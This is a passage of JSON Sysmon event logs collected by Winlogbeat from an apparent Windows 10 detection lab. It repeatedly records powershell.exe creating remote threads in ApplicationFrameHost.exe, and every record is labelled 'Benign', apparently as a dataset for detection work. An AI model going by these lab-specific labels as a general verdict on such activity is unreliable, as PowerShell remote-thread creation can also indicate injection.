(WinBuild.160101.0800)","build":"18363.418","type":"windows","platform":"windows"},"id":"04787c88-5486-46f2-93fc-7f6805a92d42","ip":["192.168.56.107","10.0.2.15"],"name":"win10.windomain.local","mac":["08:00:27:c5:40:cf","08:00:27:47:b4:2e"],"hostname":"win10","architecture":"x86_64"},"process":{"pid":2436,"thread":null,"entity_id":"{04787c88-fdd1-623a-7101-000000000c00}","executable":"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe","name":"powershell.exe","param2":null},"winlog":{"channel":"Microsoft-Windows-Sysmon/Operational","event_id":"8","api":"wineventlog","record_id":8665,"computer_name":"win10.windomain.local","provider_name":"Microsoft-Windows-Sysmon","provider_guid":"{5770385f-c22a-43e0-bf4c-06f5698ffbd9}","keywords":null,"event_data":{"param2":null,"param1":null}},"event":{"kind":"event","provider":"Microsoft-Windows-Sysmon","created":"2022-03-23T11:00:38.704Z","code":"8"},"log":{"level":"information"},"verdict":"Benign"},{"@timestamp":"2022-03-23T11:00:36.891Z","@metadata":{"beat":"winlogbeat","type":"_doc","version":"7.15.2"},"message":"CreateRemoteThread detected:\nRuleName: -\nUtcTime: 2022-03-23 11:00:36.891\nSourceProcessGuid: {04787c88-fdd1-623a-7101-000000000c00}\nSourceProcessId: 2436\nSourceImage: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\nTargetProcessGuid: {04787c88-f877-623a-7800-000000000c00}\nTargetProcessId: 5836\nTargetImage: C:\\Windows\\System32\\ApplicationFrameHost.exe\nNewThreadId: 6936\nStartAddress: 0x000001EF2F130000\nStartModule: -\nStartFunction: -\nSourceUser: WIN10\\vagrant\nTargetUser: WIN10\\vagrant","ecs":{"version":"1.11.0"},"agent":{"ephemeral_id":"2a39ce90-bef1-48a2-9e5f-bcaee6f2b27c","id":"6a7bb1af-5225-4683-bb1f-a6736ccafa24","name":"win10","type":"winlogbeat","version":"7.15.2","hostname":"win10"},"host":{"os":{"version":"10.0","family":"windows","name":"Windows 10 Enterprise Evaluation","kernel":"10.0.18362.418 (WinBuild.160101.0800)","build":"18363.418","type":"windows","platform":"windows"},"id":"04787c88-5486-46f2-93fc-7f6805a92d42","ip":["192.168.56.107","10.0.2.15"],"name":"win10.windomain.local","mac":["08:00:27:c5:40:cf","08:00:27:47:b4:2e"],"hostname":"win10","architecture":"x86_64"},"process":{"pid":2436,"thread":null,"entity_id":"{04787c88-fdd1-623a-7101-000000000c00}","executable":"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe","name":"powershell.exe","param2":null},"winlog":{"channel":"Microsoft-Windows-Sysmon/Operational","event_id":"8","api":"wineventlog","record_id":8666,"computer_name":"win10.windomain.local","provider_name":"Microsoft-Windows-Sysmon","provider_guid":"{5770385f-c22a-43e0-bf4c-06f5698ffbd9}","keywords":null,"event_data":{"param2":null,"param1":null}},"event":{"kind":"event","provider":"Microsoft-Windows-Sysmon","created":"2022-03-23T11:00:38.704Z","code":"8"},"log":{"level":"information"},"verdict":"Benign"},{"@timestamp":"2022-03-23T11:00:36.891Z","@metadata":{"beat":"winlogbeat","type":"_doc","version":"7.15.2"},"message":"CreateRemoteThread detected:\nRuleName: -\nUtcTime: 2022-03-23 11:00:36.891\nSourceProcessGuid: {04787c88-fdd1-623a-7101-000000000c00}\nSourceProcessId: 2436\nSourceImage: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\nTargetProcessGuid: {04787c88-f877-623a-7800-000000000c00}\nTargetProcessId: 5836\nTargetImage: C:\\Windows\\System32\\ApplicationFrameHost.exe\nNewThreadId: 4304\nStartAddress: 0x000001EF2F130000\nStartModule: -\nStartFunction: -\nSourceUser: WIN10\\vagrant\nTargetUser: WIN10\\vagrant","ecs":{"version":"1.11.0"},"agent":{"ephemeral_id":"2a39ce90-bef1-48a2-9e5f-bcaee6f2b27c","id":"6a7bb1af-5225-4683-bb1f-a6736ccafa24","name":"win10","type":"winlogbeat","version":"7.15.2","hostname":"win10"},"host":{"os":{"version":"10.0","family":"windows","name":"Windows 10 Enterprise Evaluation","kernel":"10.0.18362.418 (WinBuild.160101.0800)","build":"18363.418","type":"windows","platform":"windows"},"id":"04787c88-5486-46f2-93fc-7f6805a92d42","ip":["192.168.56.107","10.0.2.15"],"name":"win10.windomain.local","mac":["08:00:27:c5:40:cf","08:00:27:47:b4:2e"],"hostname":"win10","architecture":"x86_64"},"process":{"pid":2436,"thread":null,"entity_id":"{04787c88-fdd1-623a-7101-000000000c00}","executable":"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe","name":"powershell.exe","param2":null},"winlog":{"channel":"Microsoft-Windows-Sysmon/Operational","event_id":"8","api":"wineventlog","record_id":8667,"computer_name":"win10.windomain.local","provider_name":"Microsoft-Windows-Sysmon","provider_guid":"{5770385f-c22a-43e0-bf4c-06f5698ffbd9}","keywords":null,"event_data":{"param2":null,"param1":null}},"event":{"kind":"event","provider":"Microsoft-Windows-Sysmon","created":"2022-03-23T11:00:38.704Z","code":"8"},"log":{"level":"information"},"verdict":"Benign"},{"@timestamp":"2022-03-23T11:00:36.953Z","@metadata":{"beat":"winlogbeat","type":"_doc","version":"7.15.2"},"message":"CreateRemoteThread detected:\nRuleName: -\nUtcTime: 2022-03-23 11:00:36.953\nSourceProcessGuid: {04787c88-fdd1-623a-7101-000000000c00}\nSourceProcessId: 2436\nSourceImage: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\nTargetProcessGuid: {04787c88-f877-623a-7800-000000000c00}\nTargetProcessId: 5836\nTargetImage: C:\\Windows\\System32\\ApplicationFrameHost.exe\nNewThreadId: 3104\nStartAddress: 0x000001EF2F130000\nStartModule: -\nStartFunction: -\nSourceUser: WIN10\\vagrant\nTargetUser: WIN10\\vagrant","ecs":{"version":"1.11.0"},"agent":{"ephemeral_id":"2a39ce90-bef1-48a2-9e5f-bcaee6f2b27c","id":"6a7bb1af-5225-4683-bb1f-a6736ccafa24","name":"win10","type":"winlogbeat","version":"7.15.2","hostname":"win10"},"host":{"os":{"version":"10.0","family":"windows","name":"Windows 10 Enterprise Evaluation","kernel":"10.0.18362.418 (WinBuild.160101.0800)","build":"18363.418","type":"windows","platform":"windows"},"id":"04787c88-5486-46f2-93fc-7f6805a92d42","ip":["192.168.56.107","10.0.2.15"],"name":"win10.windomain.local","mac":["08:00:27:c5:40:cf","08:00:27:47:b4:2e"],"hostname":"win10","architecture":"x86_64"},"process":{"pid":2436,"thread":null,"entity_id":"{04787c88-fdd1-623a-7101-000000000c00}","executable":"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe","name":"powershell.exe","param2":null},"winlog":{"channel":"Microsoft-Windows-Sysmon/Operational","event_id":"8","api":"wineventlog","record_id":8668,"computer_name":"win10.windomain.local","provider_name":"Microsoft-Windows-Sysmon","provider_guid":"{5770385f-c22a-43e0-bf4c-06f5698ffbd9}","keywords":null,"event_data":{"param2":null,"param1":null}},"event":{"kind":"event","provider":"Microsoft-Windows-Sysmon","created":"2022-03-23T11:00:38.704Z","code":"8"},"log":{"level":"information"},"verdict":"Benign"},{"@timestamp":"2022-03-23T11:00:36.953Z","@metadata":{"beat":"winlogbeat","type":"_doc","version":"7.15.2"},"message":"CreateRemoteThread detected:\nRuleName: -\nUtcTime: 2022-03-23 11:00:36.953\nSourceProcessGuid: {04787c88-fdd1-623a-7101-000000000c00}\nSourceProcessId: 2436\nSourceImage: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\nTargetProcessGuid: {04787c88-f877-623a-7800-000000000c00}\nTargetProcessId: 5836\nTargetImage: C:\\Windows\\System32\\ApplicationFrameHost.exe\nNewThreadId: 3260\nStartAddress: 0x000001EF2F130000\nStartModule: -\nStartFunction: -\nSourceUser: WIN10\\vagrant\nTargetUser: WIN10\\vagrant","ecs":{"version":"1.11.0"},"agent":{"ephemeral_id":"2a39ce90-bef1-48a2-9e5f-bcaee6f2b27c","id":"6a7bb1af-5225-4683-bb1f-a6736ccafa24","name":"win10","type":"winlogbeat","version":"7.15.2","hostname":"win10"},"host":{"os":{"version":"10.0","family":"windows","name":"Windows 10 Enterprise Evaluation","kernel":"10.0.18362.418 (WinBuild.160101.0800)","build":"18363.418","type":"windows","platform":"windows"},"id":"04787c88-5486-46f2-93fc-7f6805a92d42","ip":["192.168.56.107","10.0.2.15"],"name":"win10.windomain.local","mac":["08:00:27:c5:40:cf","08:00:27:47:b4:2e"],"hostname":"win10","architecture":"x86_64"},"process":{"pid":2436,"thread":null,"entity_id":"{04787c88-fdd1-623a-7101-000000000c00}","executable":"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe","name":"powershell.exe","param2":null},"winlog":{"channel":"Microsoft-Windows-Sysmon/Operational","event_id":"8","api":"wineventlog","record_id":8669,"computer_name":"win10.windomain.local","provider_name":"Microsoft-Windows-Sysmon","provider_guid":"{5770385f-c22a-43e0-bf4c-06f5698ffbd9}","keywords":null,"event_data":{"param2":null,"param1":null}},"event":{"kind":"event","provider":"Microsoft-Windows-Sysmon","created":"2022-03-23T11:00:38.704Z","code":"8"},"log":{"level":"information"},"verdict":"Benign"},{"@timestamp":"2022-03-23T11:00:36.953Z","@metadata":{"beat":"winlogbeat","type":"_doc","version":"7.15.2"},"message":"CreateRemoteThread detected:\nRuleName: -\nUtcTime: 2022-03-23 11:00:36.953\nSourceProcessGuid: {04787c88-fdd1-623a-7101-000000000c00}\nSourceProcessId: 2436\nSourceImage: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\nTargetProcessGuid: {04787c88-f877-623a-7800-000000000c00}\nTargetProcessId: 5836\nTargetImage: C:\\Windows\\System32\\ApplicationFrameHost.exe\nNewThreadId: 5036\nStartAddress: 0x000001EF2F130000\nStartModule: -\nStartFunction: -\nSourceUser: WIN10\\vagrant\nTargetUser: WIN10\\vagrant","ecs":{"version":"1.11.0"},"agent":{"ephemeral_id":"2a39ce90-bef1-48a2-9e5f-bcaee6f2b27c","id":"6a7bb1af-5225-4683-bb1f-a6736ccafa24","name":"win10","type":"winlogbeat","version":"7.15.2","hostname":"win10"},"host":{"os":{"version":"10.0","family":"windows","name":"Windows 10 Enterprise Evaluation","kernel":"10.0.18362.418 (WinBuild.160101.0800)","build":"18363.418","type":"windows","platform":"windows"},"id":"04787c88-5486-46f2-93fc-7f6805a92d42","ip":["192.168.56.107","10.0.2.15"],"name":"win10.windomain.local","mac":["08:00:27:c5:40:cf","08:00:27:47:b4:2e"],"hostname":"win10","architecture":"x86_64"},"process":{"pid":2436,"thread":null,"entity_id":"{04787c88-fdd1-623a-7101-000000000c00}","executable":"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe","name":"powershell.exe","param2":null},"winlog":{"channel":"Microsoft-Windows-Sysmon/Operational","event_id":"8","api":"wineventlog","record_id":8670,"computer_name":"win10.windomain.local","provider_name":"Microsoft-Windows-Sysmon","provider_guid":"{5770385f-c22a-43e0-bf4c-06f5698ffbd9}","keywords":null,"event_data":{"param2":null,"param1":null}},"event":{"kind":"event","provider":"Microsoft-Windows-Sysmon","created":"2022-03-23T11:00:38.704Z","code":"8"},"log":{"level":"information"},"verdict":"Benign"},{"@timestamp":"2022-03-23T11:00:36.969Z","@metadata":{"beat":"winlogbeat","type":"_doc","version":"7.15.2"},"message":"CreateRemoteThread detected:\nRuleName: -\nUtcTime: 2022-03-23 11:00:36.969\nSourceProcessGuid: {04787c88-fdd1-623a-7101-000000000c00}\nSourceProcessId: 2436\nSourceImage: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\nTargetProcessGuid: {04787c88-f877-623a-7800-000000000c00}\nTargetProcessId: 5836\nTargetImage: C:\\Windows\\System32\\ApplicationFrameHost.exe\nNewThreadId: 4300\nStartAddress: 0x000001EF2F130000\nStartModule: -\nStartFunction: -\nSourceUser: WIN10\\vagrant\nTargetUser: WIN10\\vagrant","ecs":{"version":"1.11.0"},"agent":{"ephemeral_id":"2a39ce90-bef1-48a2-9e5f-bcaee6f2b27c","id":"6a7bb1af-5225-4683-bb1f-a6736ccafa24","name":"win10","type":"winlogbeat","version":"7.15.2","hostname":"win10"},"host":{"os":{"version":"10.0","family":"windows","name":"Windows 10 Enterprise Evaluation","kernel":"10.0.18362.418 (WinBuild.160101.0800)","build":"18363.418","type":"windows","platform":"windows"},"id":"04787c88-5486-46f2-93fc-7f6805a92d42","ip":["192.168.56.107","10.0.2.15"],"name":"win10.windomain.local","mac":["08:00:27:c5:40:cf","08:00:27:47:b4:2e"],"hostname":"win10","architecture":"x86_64"},"process":{"pid":2436,"thread":null,"entity_id":"{04787c88-fdd1-623a-7101-000000000c00}","executable":"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe","name":"powershell.exe","param2":null},"winlog":{"channel":"Microsoft-Windows-Sysmon/Operational","event_id":"8","api":"wineventlog","record_id":8671,"computer_name":"win10.windomain.local","provider_name":"Microsoft-Windows-Sysmon","provider_guid":"{5770385f-c22a-43e0-bf4c-06f5698ffbd9}","keywords":null,"event_data":{"param2":null,"param1":null}},"event":{"kind":"event","provider":"Microsoft-Windows-Sysmon","created":"2022-03-23T11:00:38.705Z","code":"8"},"log":{"level":"information"},"verdict":"Benign"},{"@timestamp":"2022-03-23T11:00:36.969Z","@metadata":{"beat":"winlogbeat","type":"_doc","version":"7.15.2"},"message":"CreateRemoteThread detected:\nRuleName: -\nUtcTime: 2022-03-23 11:00:36.969\nSourceProcessGuid: {04787c88-fdd1-623a-7101-000000000c00}\nSourceProcessId: 2436\nSourceImage: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\nTargetProcessGuid: {04787c88-f877-623a-7800-000000000c00}\nTargetProcessId: 5836\nTargetImage: C:\\Windows\\System32\\ApplicationFrameHost.exe\nNewThreadId: 6360\nStartAddress: 0x000001EF2F130000\nStartModule: -\nStartFunction: -\nSourceUser: WIN10\\vagrant\nTargetUser: WIN10\\vagrant","ecs":{"version":"1.11.0"},"agent":{"ephemeral_id":"2a39ce90-bef1-48a2-9e5f-bcaee6f2b27c","id":"6a7bb1af-5225-4683-bb1f-a6736ccafa24","name":"win10","type":"winlogbeat","version":"7.15.2","hostname":"win10"},"host":{"os":{"version":"10.0","family":"windows","name":"Windows 10 Enterprise Evaluation","kernel":"10.0.18362.418 (WinBuild.160101.0800)","build":"18363.418","type":"windows","platform":"windows"},"id":"04787c88-5486-46f2-93fc-7f6805a92d42","ip":["192.168.56.107","10.0.2.15"],"name":"win10.windomain.local","mac":["08:00:27:c5:40:cf","08:00:27:47:b4:2e"],"hostname":"win10","architecture":"x86_64"},"process":{"pid":2436,"thread":null,"entity_id":"{04787c88-fdd1-623a-7101-000000000c00}","executable":"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe","name":"powershell.exe","param2":null},"winlog":{"channel":"Microsoft-Windows-Sysmon/Operational","event_id":"8","api":"wineventlog","record_id":8672,"computer_name":"win10.windomain.local","provider_name":"Microsoft-Windows-Sysmon","provider_guid":"{5770385f-c22a-43e0-bf4c-06f5698ffbd9}","keywords":null,"event_data":{"param2":null,"param1":null}},"event":{"kind":"event","provider":"Microsoft-Windows-Sysmon","created":"2022-03-23T11:00:38.705Z","code":"8"},"log":{"level":"information"},"verdict":"Benign"},{"@timestamp":"2022-03-23T11:00:36.969Z","@metadata":{"beat":"winlogbeat","type":"_doc","version":"7.15.2"},"message":"CreateRemoteThread detected:\nRuleName: -\nUtcTime: 2022-03-23 11:00:36.969\nSourceProcessGuid: {04787c88-fdd1-623a-7101-000000000c00}\nSourceProcessId: 2436\nSourceImage: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\nTargetProcessGuid: {04787c88-f877-623a-7800-000000000c00}\nTargetProcessId: 5836\nTargetImage: C:\\Windows\\System32\\ApplicationFrameHost.exe\nNewThreadId: 2704\nStartAddress: 0x000001EF2F130000\nStartModule: -\nStartFunction: -\nSourceUser: WIN10\\vagrant\nTargetUser: WIN10\\vagrant","ecs":{"version":"1.11.0"},"agent":{"ephemeral_id":"2a39ce90-bef1-48a2-9e5f-bcaee6f2b27c","id":"6a7bb1af-5225-4683-bb1f-a6736ccafa24","name":"win10","type":"winlogbeat","version":"7.15.2","hostname":"win10"},"host":{"os":{"version":"10.0","family":"windows","name":"Windows 10 Enterprise Evaluation","kernel":"10.0.18362.418 (WinBuild.160101.0800)","build":"18363.418","type":"windows","platform":"windows"},"id":"04787c88-5486-46f2-93fc-7f6805a92d42","ip":["192.168.56.107","10.0.2.15"],"name":"win10.windomain.local","mac":["08:00:27:c5:40:cf","08:00:27:47:b4:2e"],"hostname":"win10","architecture":"x86_64"},"process":{"pid":2436,"thread":null,"entity_id":"{04787c88-fdd1-623a-7101-000000000c00}","executable":"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe","name":"powershell.exe","param2":null},"winlog":{"channel":"Microsoft-Windows-Sysmon/Operational","event_id":"8","api":"wineventlog","record_id":8673,"computer_name":"win10.windomain.local","provider_name":"Microsoft-Windows-Sysmon","provider_guid":"{5770385f-c22a-43e0-bf4c-06f5698ffbd9}","keywords":null,"event_data":{"param2":null,"param1":null}},"event":{"kind":"event","provider":"Microsoft-Windows-Sysmon","created":"2022-03-23T11:00:38.705Z","code":"8"},"log":{"level":"information"},"verdict":"Benign"},{"@timestamp":"2022-03-23T11:00:36.985Z","@metadata":{"beat":"winlogbeat","type":"_doc","version":"7.15.2"},"message":"CreateRemoteThread detected:\nRuleName: -\nUtcTime: 2022-03-23 11:00:36.985\nSourceProcessGuid: {04787c88-fdd1-623a-7101-000000000c00}\nSourceProcessId: 2436\nSourceImage: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\nTargetProcessGuid: {04787c88-f877-623a-7800-000000000c00}\nTargetProcessId: 5836\nTargetImage: C:\\Windows\\System32\\ApplicationFrameHost.exe\nNewThreadId: 6972\nStartAddress: 0x000001EF2F130000\nStartModule: -\nStartFunction: -\nSourceUser: WIN10\\vagrant\nTargetUser: WIN10\\vagrant","ecs":{"version":"1.11.0"},"agent":{"ephemeral_id":"2a39ce90-bef1-48a2-9e5f-bcaee6f2b27c","id":"6a7bb1af-5225-4683-bb1f-a6736ccafa24","name":"win10","type":"winlogbeat","version":"7.15.2","hostname":"win10"},"host":{"os":{"version":"10.0","family":"windows","name":"Windows 10 Enterprise Evaluation","kernel":"10.0.18362.418 (WinBuild.160101.0800)","build":"18363.418","type":"windows","platform":"windows"},"id":"04787c88-5486-46f2-93fc-7f6805a92d42","ip":["192.168.56.107","10.0.2.15"],"name":"win10.windomain.local","mac":["08:00:27:c5:40:cf","08:00:27:47:b4:2e"],"hostname":"win10","architecture":"x86_64"},"process":{"pid":2436,"thread":null,"entity_id":"{04787c88-fdd1-623a-7101-000000000c00}","executable":"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe","name":"powershell.exe","param2":null},"winlog":{"channel":"Microsoft-Windows-Sysmon/Operational","event_id":"8","api":"wineventlog","record_id":8674,"computer_name":"win10.windomain.local","provider_name":"Microsoft-Windows-Sysmon","provider_guid":"{5770385f-c22a-43e0-bf4c-06f5698ffbd9}","keywords":null,"event_data":{"param2":null,"param1":null}},"event":{"kind":"event","provider":"Microsoft-Windows-Sysmon","created":"2022-03-23T11:00:38.705Z","code":"8"},"log":{"level":"information"},"verdict":"Benign"},{"@timestamp":"2022-03-23T11:00:36.985Z","@metadata":{"beat":"winlogbeat","type":"_doc","version":"7.15.2"},"message":"CreateRemoteThread detected:\nRuleName: -\nUtcTime: 2022-03-23 11:00:36.985\nSourceProcessGuid: {04787c88-fdd1-623a-7101-000000000c00}\nSourceProcessId: 2436\nSourceImage: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\nTargetProcessGuid: {04787c88-f877-623a-7800-000000000c00}\nTargetProcessId: 5836\nTargetImage: C:\\Windows\\System32\\ApplicationFrameHost.exe\nNewThreadId: 1840\nStartAddress: 0x000001EF2F130000\nStartModule: -\nStartFunction: -\nSourceUser: WIN10\\vagrant\nTargetUser: WIN10\\vagrant","ecs":{"version":"1.11.0"},"agent":{"ephemeral_id":"2a39ce90-bef1-48a2-9e5f-bcaee6f2b27c","id":"6a7bb1af-5225-4683-bb1f-a6736ccafa24","name":"win10","type":"winlogbeat","version":"7.15.2","hostname":"win10"},"host":{"os":{"version":"10.0","family":"windows","name":"Windows 10 Enterprise Evaluation","kernel":"10.0.18362.418 (WinBuild.160101.0800)","build":"18363.418","type":"windows","platform":"windows"},"id":"04787c88-5486-46f2-93fc-7f6805a92d42","ip":["192.168.56.107","10.0.2.15"],"name":"win10.windomain.local","mac":["08:00:27:c5:40:cf","08:00:27:47:b4:2e"],"hostname":"win10","architecture":"x86_64"},"process":{"pid":2436,"thread":null,"entity_id":"{04787c88-fdd1-623a-7101-000000000c00}","executable":"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe","name":"powershell.exe","param2":null},"winlog":{"channel":"Microsoft-Windows-Sysmon/Operational","event_id":"8","api":"wineventlog","record_id":8675,"computer_name":"win10.windomain.local","provider_name":"Microsoft-Windows-Sysmon","provider_guid":"{5770385f-c22a-43e0-bf4c-06f5698ffbd9}","keywords":null,"event_data":{"param2":null,"param1":null}},"event":{"kind":"event","provider":"Microsoft-Windows-Sysmon","created":"2022-03-23T11:00:38.705Z","code":"8"},"log":{"level":"information"},"verdict":"Benign"},{"@timestamp":"2022-03-23T11:00:37.000Z","@metadata":{"beat":"winlogbeat","type":"_doc","version":"7.15.2"},"message":"CreateRemoteThread detected:\nRuleName: -\nUtcTime: 2022-03-23 11:00:37.000\nSourceProcessGuid: {04787c88-fdd1-623a-7101-000000000c00}\nSourceProcessId: 2436\nSourceImage: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\nTargetProcessGuid: {04787c88-f877-623a-7800-000000000c00}\nTargetProcessId: 5836\nTargetImage: C:\\Windows\\System32\\ApplicationFrameHost.exe\nNewThreadId: 4468\nStartAddress: 0x000001EF2F130000\nStartModule: -\nStartFunction: -\nSourceUser: WIN10\\vagrant\nTargetUser: WIN10\\vagrant","ecs":{"version":"1.11.0"},"agent":{"ephemeral_id":"2a39ce90-bef1-48a2-9e5f-bcaee6f2b27c","id":"6a7bb1af-5225-4683-bb1f-a6736ccafa24","name":"win10","type":"winlogbeat","version":"7.15.2","hostname":"win10"},"host":{"os":{"version":"10.0","family":"windows","name":"Windows 10 Enterprise Evaluation","kernel":"10.0.18362.418 (WinBuild.160101.0800)","build":"18363.418","type":"windows","platform":"windows"},"id":"04787c88-5486-46f2-93fc-7f6805a92d42","ip":["192.168.56.107","10.0.2.15"],"name":"win10.windomain.local","mac":["08:00:27:c5:40:cf","08:00:27:47:b4:2e"],"hostname":"win10","architecture":"x86_64"},"process":{"pid":2436,"thread":null,"entity_id":"{04787c88-fdd1-623a-7101-000000000c00}","executable":"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe","name":"powershell.exe","param2":null},"winlog":{"channel":"Microsoft-Windows-Sysmon/Operational","event_id":"8","api":"wineventlog","record_id":8676,"computer_name":"win10.windomain.local","provider_name":"Microsoft-Windows-Sysmon","provider_guid":"{5770385f-c22a-43e0-bf4c-06f5698ffbd9}","keywords":null,"event_data":{"param2":null,"param1":null}},"event":{"kind":"event","provider":"Microsoft-Windows-Sysmon","created":"2022-03-23T11:00:38.705Z","code":"8"},"log":{"level":"information"},"verdict":"Benign"},